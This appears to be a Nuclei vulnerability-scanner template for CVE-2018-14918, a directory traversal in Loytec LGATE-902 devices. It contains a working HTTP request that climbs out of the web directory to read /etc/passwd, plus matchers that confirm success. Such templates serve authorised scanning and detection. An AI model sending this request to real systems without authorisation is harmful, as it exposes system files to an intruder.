id: cve-2018-14918
info:
  name: LOYTEC LINX Directory Traversal
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    Loytec LGATE-902 versions prior to 6.4.2 have a directory traversal vulnerability that can be exploited to read arbitrary files in the system.
  reference:
    - https://packetstormsecurity.com/files/152453/Loytec-LGATE-902-XSS-Traversal-File-Deletion.html
    - http://www.loytec.com/support/download
  classification:
    cvss-score: 5.6
    cve-id:
      - CVE-2018-14918
  tags:
    - directory-traversal

http:
  - raw:
      - |
        GET /webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ":/bin/sh"
          - "/home/admin"
        part: body
